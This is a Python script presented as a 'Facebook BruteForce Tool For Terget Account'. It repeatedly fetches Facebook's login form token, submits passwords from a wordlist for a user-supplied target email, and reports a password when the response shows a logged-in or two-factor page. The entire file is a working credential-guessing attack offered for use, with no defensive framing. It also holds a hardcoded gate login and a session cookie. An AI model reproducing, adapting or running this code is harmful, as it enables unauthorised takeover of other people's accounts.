import sys, os, sys, requests
from getpass import getpass
import os.path
from time import sleep
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style

# variables
wordList = "passwords.txt"
minimumPasswordLength = 6
postURL = "https://www.facebook.com/login.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
}

# payload ans cookies
PAYLOAD = {}
COOKIES = {}

# function one
def createForm():
    form = dict()
    cookies = {"fr": "0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy"}

    data = requests.get(postURL, headers=headers)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, "html.parser").form
    if data.input["name"] == "lsd":
        form["lsd"] = data.input["value"]
    return form, cookies


# function two
def isThisAPassword(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = createForm()
        PAYLOAD["email"] = email
    PAYLOAD["pass"] = password
    r = requests.post(postURL, data=PAYLOAD, cookies=COOKIES, headers=headers)
    if (
        "Find Friends" in r.text
        or "security code" in r.text
        or "Two-factor authentication" in r.text
        or "Log Out" in r.text
    ):
        open("temp", "w").write(str(r.content))
        print("\npassword found is: ", password)
        return True
    return False


if __name__ == "__main__":
    print(
        Fore.BLUE
        + """ \n
   ██╗███╗░░██╗████████╗██╗██╗░░░░░██╗███████╗
   ██║████╗░██║╚══██╔══╝██║██║░░░░░██║██╔════╝
   ██║██╔██╗██║░░░██║░░░██║██║░░░░░██║█████╗░░
   ██║██║╚████║░░░██║░░░██║██║░░░░░██║██╔══╝░░
   ██║██║░╚███║░░░██║░░░██║███████╗██║███████╗
   ╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚══════╝╚═╝╚══════╝ 
          """
    )
    print(Fore.RED + " \n -----------------------------------------------")
    print(Fore.GREEN + "\n                    INTELIE \n")
    print(Fore.RED + "   Facebook BruteForce Tool For Terget Account ")
    print("           Author : Md. Nur Habib \n" + Fore.GREEN)

# Username & Password
loginUserPass = ["nurhabib", "123123@@@"]

# Username and Password Entry
loginUsername = input("Enter Username: ")
loginPassword = getpass("Enter Password: ")

if loginUsername == loginUserPass[0] and loginPassword == loginUserPass[1]:
    print("Login Successfully")
    sleep(1)
    os.system("clear")
else:
    print("Wrong Login Information, Try Again. ")
    sys.exit()

if not os.path.isfile(wordList):
    print("Password file is not exist: ", wordList)
    sys.exit(0)
passwordData = open(wordList, "r").read().split("\n")
print("Password file selected: ", wordList)
email = input("Enter Email/Username of Target Account : ").strip()
for index, password in zip(range(passwordData.__len__()), passwordData):
    password = password.strip()
    if len(password) < minimumPasswordLength:
        continue
    print("Trying password [", index, "]: ", password)
    if isThisAPassword(email, index, password):
        break
